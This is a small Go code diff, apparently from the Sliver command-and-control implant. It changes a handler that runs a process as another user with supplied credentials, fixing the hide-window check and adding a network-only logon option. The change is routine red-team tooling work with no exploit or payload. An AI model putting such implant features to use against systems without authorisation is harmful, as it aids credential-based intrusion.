@@ -153,10 +153,10 @@ func runAsHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	show := 10
-	if runAsReq.HideWindow == "" {
+	if runAsReq.HideWindow {
 		show = 0
 	}
-	err = priv.RunAs(runAsReq.Username, runAsReq.Domain, runAsReq.Password, runAsReq.ProcessName, runAsReq.Args, show)
+	err = priv.RunAs(runAsReq.Username, runAsReq.Domain, runAsReq.Password, runAsReq.ProcessName, runAsReq.Args, show, runAsReq.NetOnly)
 	runAs := &sliverpb.RunAs{}
 	if err != nil {
 		runAs.Response = &commonpb.Response{Err: err.Error()}
